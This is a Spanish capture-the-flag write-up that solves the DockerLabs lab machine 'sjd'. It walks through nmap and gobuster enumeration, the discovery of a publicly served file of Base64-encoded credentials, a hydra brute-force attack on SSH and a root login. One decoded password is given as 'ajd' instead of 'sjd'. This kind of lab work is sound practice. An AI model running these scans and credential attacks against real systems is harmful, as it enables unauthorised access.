---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# sjd DockerLabs (Very Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip sjd.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh sjd.tar
```

Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____   
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__   
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]  

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-27 04:34 EST
Nmap scan report for 172.17.0.2
Host is up (0.000032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e3:6b:e1:c3:e0:14:74:3e:df:a3:f1:d8:64:69:80:50 (ECDSA)
|_  256 17:ce:1a:bb:ef:6d:9e:9d:c2:41:41:0b:0f:82:32:0d (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Reparaci\xC3\xB3n de Computadoras SJD
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.75 seconds
```

Vemos una pagina aparentemente normal, por lo que realizaremos un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP> -w <WORDLIST> -x html,php,txt -t 100 -k
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/descargas.html       (Status: 200) [Size: 4468]
/img                  (Status: 301) [Size: 306] [--> http://172.17.0.2/img/]
/index.php            (Status: 200) [Size: 6968]
/index1.html          (Status: 200) [Size: 10703]
/pass.txt             (Status: 200) [Size: 42]
/server-status        (Status: 403) [Size: 275]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que hay un archivo bastante interesante llamado `/pass.txt` y si entramos en el veremos lo siguiente:

```
sjd c2pkCg==
admin YWRtaW4K
root MTk3MQo=
```

Vemos que pueden ser `3` posibles usuarios con sus contraseñas codificadas en `Base64` por lo que haremos lo siguiente:

```
sjd ajd
admin admin
root 1971
```

Asi se veria de forma decodificada.

Por lo que vamos a realizar `fuerza bruta` con la herramienta `hydra`.

## Hydra

> users.txt

```
sjd
admin
root
```

> pass.txt

```
sjd
admin
1971
```

Ahora con `hydra` haremos lo siguiente:

```shell
hydra -L users.txt -P pass.txt ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-27 05:16:26
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: sjd   password: sjd
[22][ssh] host: 172.17.0.2   login: root   password: 1971
[22][ssh] host: 172.17.0.2   login: admin   password: admin
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-27 05:16:30
```

Vemos que los `3` usuarios funcionan, pero el que mas nos interesa es el de `root`, por lo que nos conectaremos de la siguiente forma:

## SSH

```shell
ssh root@<IP>
```

Metemos como contraseña `1971` y veremos que estamos dentro como el usuario `root`.

Info:

```
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:VICRoK2N/Zw01oNp8yqG9D8m0AwQbBFQLtb/DY5APT0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
root@172.17.0.2's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.11-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
root@d70dc147f847:~# whoami
root
```

Por lo que ya habremos terminado la maquina.
